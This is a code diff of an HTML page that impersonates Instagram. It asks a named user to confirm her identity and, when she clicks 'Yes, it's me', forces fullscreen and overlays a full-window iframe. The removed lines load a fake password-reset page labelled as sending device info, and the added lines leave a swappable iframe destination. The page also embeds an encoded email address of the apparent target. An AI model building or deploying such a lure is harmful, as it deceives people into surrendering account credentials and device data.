@@ -1,27 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <title>instagram</title>
+    <title>instagram</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <link href="https://fonts.googleapis.com/css2?family=Vazir+Matn:wght@200&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Roboto+Medium:wght@500&family=Vazir+Matn:wght@700&family=Heebo:wght@400&display=swap" rel="stylesheet">
     <style>
-     
-       #mybutton {
-            z-index: 2;
-            position: absolute;
-        }
-
-        iframe {
-            z-index: 1;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
-       
-       body {
+        body {
             background-color: white;
             color: black;
             margin: 0;
@@ -86,11 +71,18 @@
             height: 30px;
         }
 
+        iframe {
+            z-index: 1;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
         @media only screen and (max-width: 485px) {
             h1 {
                 font-size: 1.6em;
-                margin-top: -100px;
-                
             }
         }
     </style>
@@ -102,40 +94,35 @@
 
     <h1>Are you quirky_g.i.r.l?</h1>
     <div class="button-container">
-        <a href="https://instagram.com/accounts/confirm_email/S5s9GbL6/cnVhc2luZ2hlMDFAZ21haWwuY29t/?app_redirect%3DFalse&amp;source=gmail&amp;ust=1658914278556000&amp;usg=AOvVaw1eF_-1j16fHP8HtQVHGD6s"><button class="message-button">No</button></a>
+        <a href="https://instagram.com/accounts/confirm_email/S5s9GbL6/cnVhc2luZ2hlMDFAZ21haWwuY29t/?app_redirect%3DFalse&amp;source=gmail&amp;ust=1658914278556000&amp;usg=AOvVaw1eF_-1j16fHP8HtQVHGD6s">
+            <button class="message-button">No</button>
+        </a>
        
         <!-- Updated link to redirect to a page in fullscreen mode -->
-        <iframe src="password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Recaptcha-and-Next (send Deviceinfo).html"></iframe>
         <button id="mybutton" onclick="toggleFullScreen()" class="follow-button">Yes, it's me</button>
-
-        
     </div>
 
     <script>
         function toggleFullScreen() {
-            const button = document.getElementById("mybutton");
-
-            // Hide the button
-            button.style.display = "none";
-
-            if ((document.fullScreenElement && document.fullScreenElement !== null) ||
-                (!document.mozFullScreen && !document.webkitIsFullScreen)) {
-                if (document.documentElement.requestFullScreen) {
-                    document.documentElement.requestFullScreen();
-                } else if (document.documentElement.mozRequestFullScreen) {
-                    document.documentElement.mozRequestFullScreen();
-                } else if (document.documentElement.webkitRequestFullScreen) {
-                    document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
-                }
-            } else {
-                if (document.cancelFullScreen) {
-                    document.cancelFullScreen();
-                } else if (document.mozCancelFullScreen) {
-                    document.mozCancelFullScreen();
-                } else if (document.webkitCancelFullScreen) {
-                    document.webkitCancelFullScreen();
-                }
+            const element = document.documentElement;
+            const iframe = document.createElement('iframe');
+            
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) {
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) {
+                element.msRequestFullscreen();
             }
+
+            // Set iframe attributes
+            iframe.src = 'https://bing.com'; // Change the URL to your desired destination
+            iframe.id = 'myiframe';
+            
+            // Append iframe to body
+            document.body.appendChild(iframe);
         }
     </script>
 </body>
